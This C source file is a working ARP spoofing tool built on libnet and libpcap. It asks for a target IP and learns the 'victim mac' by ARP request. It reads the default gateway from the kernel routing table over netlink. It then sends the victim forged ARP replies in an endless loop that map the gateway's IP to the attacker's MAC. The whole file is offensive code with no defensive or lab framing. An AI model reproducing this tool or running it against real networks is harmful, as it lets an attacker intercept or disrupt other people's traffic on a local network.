#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <stdint.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <pcap/pcap.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/types.h>

#define BUFSIZE 8192
#define PROMISCUOUS 1
#define NONPROMISCUOUS 0
#define IP_ALEN 4

#define SIZE_ETHERNET 14

const struct sniff_ethernet *ethernet; /* The ethernet header */

                                       /* Ethernet header */
struct sniff_ethernet {
    u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
    u_short ether_type; /* IP? ARP? RARP? etc */
};

char gateway[255];

struct route_info {
    struct in_addr dstAddr;
    struct in_addr srcAddr;
    struct in_addr gateWay;
    char ifName[IF_NAMESIZE];
};


int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)
{
    struct nlmsghdr *nlHdr;
    int readLen = 0, msgLen = 0;

    do {
        /* Recieve response from the kernel */
        if ((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0) {
            perror("SOCK READ: ");
            return -1;
        }

        nlHdr = (struct nlmsghdr *) bufPtr;

        /* Check if the header is valid */
        if ((NLMSG_OK(nlHdr, readLen) == 0)
            || (nlHdr->nlmsg_type == NLMSG_ERROR)) {
            perror("Error in recieved packet");
            return -1;
        }

        /* Check if the its the last message */
        if (nlHdr->nlmsg_type == NLMSG_DONE) {
            break;
        }
        else {
            /* Else move the pointer to buffer appropriately */
            bufPtr += readLen;
            msgLen += readLen;
        }

        /* Check if its a multi part message */
        if ((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0) {
            /* return if its not */
            break;
        }
    } while ((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));
    return msgLen;
}
/* For printing the routes. */
void printRoute(struct route_info *rtInfo)
{
    char tempBuf[512];

    /* Print Destination address */
    if (rtInfo->dstAddr.s_addr != 0)
        strcpy(tempBuf, inet_ntoa(rtInfo->dstAddr));
    else
        sprintf(tempBuf, "*.*.*.*\t");
    fprintf(stdout, "%s\t", tempBuf);

    /* Print Gateway address */
    if (rtInfo->gateWay.s_addr != 0)
        strcpy(tempBuf, (char *)inet_ntoa(rtInfo->gateWay));
    else
        sprintf(tempBuf, "*.*.*.*\t");
    fprintf(stdout, "%s\t", tempBuf);

    /* Print Interface Name*/
    fprintf(stdout, "%s\t", rtInfo->ifName);

    /* Print Source address */
    if (rtInfo->srcAddr.s_addr != 0)
        strcpy(tempBuf, inet_ntoa(rtInfo->srcAddr));
    else
        sprintf(tempBuf, "*.*.*.*\t");
    fprintf(stdout, "%s\n", tempBuf);
}

/* For parsing the route info returned */
void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo)
{
    struct rtmsg *rtMsg;
    struct rtattr *rtAttr;
    int rtLen;

    rtMsg = (struct rtmsg *) NLMSG_DATA(nlHdr);

    /* If the route is not for AF_INET or does not belong to main routing table
    then return. */
    if ((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
        return;

    /* get the rtattr field */
    rtAttr = (struct rtattr *) RTM_RTA(rtMsg);
    rtLen = RTM_PAYLOAD(nlHdr);
    for (; RTA_OK(rtAttr, rtLen); rtAttr = RTA_NEXT(rtAttr, rtLen)) {
        switch (rtAttr->rta_type) {
        case RTA_OIF:
            if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
            break;
        case RTA_GATEWAY:
            rtInfo->gateWay.s_addr = *(u_int *)RTA_DATA(rtAttr);
            break;
        case RTA_PREFSRC:
            rtInfo->srcAddr.s_addr = *(u_int *)RTA_DATA(rtAttr);
            break;
        case RTA_DST:
            rtInfo->dstAddr.s_addr = *(u_int *)RTA_DATA(rtAttr);
            break;
        }
    }
    //printf("%s\n", inet_ntoa(rtInfo->dstAddr));

    if (rtInfo->dstAddr.s_addr == 0)
        sprintf(gateway, (char *)inet_ntoa(rtInfo->gateWay));
    //printRoute(rtInfo);

    return;
}


int main() {

    libnet_t *l;  /* the libnet context */
    char errbuf[LIBNET_ERRBUF_SIZE], target_ip_addr_str[16];
    u_int32_t target_ip_addr, src_ip_addr;
    u_int8_t mac_broadcast_addr[6] = { 0xff, 0xff, 0xff, 0xff,0xff, 0xff },
        mac_zero_addr[6] = { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
    struct libnet_ether_addr *src_mac_addr;
    int bytes_written;

    l = libnet_init(LIBNET_LINK, NULL, errbuf);
    if (l == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    /* Getting our own MAC and IP addresses */

    src_ip_addr = libnet_get_ipaddr4(l);
    if (src_ip_addr == -1) {
        fprintf(stderr, "Couldn't get own IP address: %s\n", \
            libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    src_mac_addr = libnet_get_hwaddr(l);
    if (src_mac_addr == NULL) {
        fprintf(stderr, "Couldn't get own IP address: %s\n", \
            libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    /* Getting target IP address */

    printf("Target IP address: ");
    scanf("%15s", target_ip_addr_str);

    target_ip_addr = libnet_name2addr4(l, target_ip_addr_str, \
        LIBNET_DONT_RESOLVE);

    if (target_ip_addr == -1) {
        fprintf(stderr, "Error converting IP address.\n");
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    /* Building ARP header */

    if (libnet_autobuild_arp(ARPOP_REQUEST, \
        src_mac_addr->ether_addr_octet, \
        (u_int8_t*)(&src_ip_addr), mac_zero_addr, \
        (u_int8_t*)(&target_ip_addr), l) == -1)
    {
        fprintf(stderr, "Error building ARP header: %s\n", \
            libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    /* Building Ethernet header */

    if (libnet_autobuild_ethernet(mac_broadcast_addr, \
        ETHERTYPE_ARP, l) == -1)
    {
        fprintf(stderr, "Error building Ethernet header: %s\n", \
            libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }


    char *dev;
    struct bpf_program fp;

    //get using device name
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("DEV : %s\n", dev);

    pcap_t *handle;         /* Session handle */
    char filter_exp[] = "arp";   /* The filter expression */

                                 /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }
    /* Compile and apply the filter */
    if (pcap_compile(handle, &fp, filter_exp, 0, src_ip_addr) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }


    /* Grab a packet */
    while (1) {


        /* Writing packet */

        bytes_written = libnet_write(l);
        if (bytes_written != -1)
            printf("%d bytes written.\n", bytes_written);
        else
            fprintf(stderr, "Error writing packet: %s\n", \
                libnet_geterror(l));

        struct pcap_pkthdr * hdr;
        const u_char * packet;
        const int res = pcap_next_ex(handle, &hdr, &packet);
        if (res<0)
            break;
        if (res == 0)
            continue;

        ethernet = (struct sniff_ethernet*)(packet);

        if (ethernet->ether_dhost[0] == src_mac_addr->ether_addr_octet[0])
        {
            printf("\n victim mac :  ");
            for (int i = 0; i<6; i++)
                printf(":%02x", ethernet->ether_shost[i]);
            break;
        }
    }


    //-----------------------------------------------------------------------

    struct nlmsghdr *nlMsg;
    struct rtmsg *rtMsg;
    struct route_info *rtInfo;
    char msgBuf[BUFSIZE];


    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    int len, msgSeq;

    //Socket could not be created


    if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0)
        perror("Socket Creation: ");

    memset(msgBuf, 0, BUFSIZE);

    /* point the header and the msg structure pointers into the buffer */
    nlMsg = (struct nlmsghdr *) msgBuf;
    rtMsg = (struct rtmsg *) NLMSG_DATA(nlMsg);

    /* Fill in the nlmsg header*/
    nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));  // Length of message.
    nlMsg->nlmsg_type = RTM_GETROUTE;   // Get the routes from kernel routing table .

    nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST;    // The message is a request for dump.
    nlMsg->nlmsg_seq = msgSeq++;    // Sequence of the message packet.
    nlMsg->nlmsg_pid = getpid();    // PID of process sending the request.

                                    /* Send the request */
    if (send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0) {
        printf("Write To Socket Failed...\n");
        return -1;
    }

    /* Read the response */
    if ((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0) {
        printf("Read From Socket Failed...\n");
        return -1;
    }
    /* Parse and print the response */
    rtInfo = (struct route_info *) malloc(sizeof(struct route_info));
    //fprintf(stdout, "Destination\tGateway\tInterface\tSource\n");
    for (; NLMSG_OK(nlMsg, len); nlMsg = NLMSG_NEXT(nlMsg, len)) {
        memset(rtInfo, 0, sizeof(struct route_info));
        parseRoutes(nlMsg, rtInfo);
    }
    free(rtInfo);
    close(sock);

    u_int8_t *macaddr = ethernet->ether_shost;
    u_int32_t getip = libnet_name2addr4(l, gateway, LIBNET_RESOLVE);
    printf("\n gateway IP: %s\n", gateway);//gateway ip

    //-------------------------------------------------------------------

    l = libnet_init(LIBNET_LINK, dev, errbuf);
    if (l == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    /* Building ARP header */
    if (libnet_autobuild_arp(ARPOP_REPLY, \
        src_mac_addr->ether_addr_octet, \
        (u_int8_t*)(&getip), macaddr, \
        (u_int8_t*)(&target_ip_addr), l) == -1)
    {
        fprintf(stderr, "Error building ARP header: %s\n", \
            libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    /* Building Ethernet header */

    if (libnet_autobuild_ethernet(macaddr, \
        ETHERTYPE_ARP, l) == -1)
    {
        fprintf(stderr, "Error building Ethernet header: %s\n", \
            libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    while (1)
    {
        bytes_written = libnet_write(l);
        sleep(1);
        if (bytes_written != -1)
            printf("%d bytes written.\n", bytes_written);
        else
            fprintf(stderr, "Error writing packet: %s\n",
                libnet_geterror(l));
    }
    libnet_destroy(l);

    return 0;
}

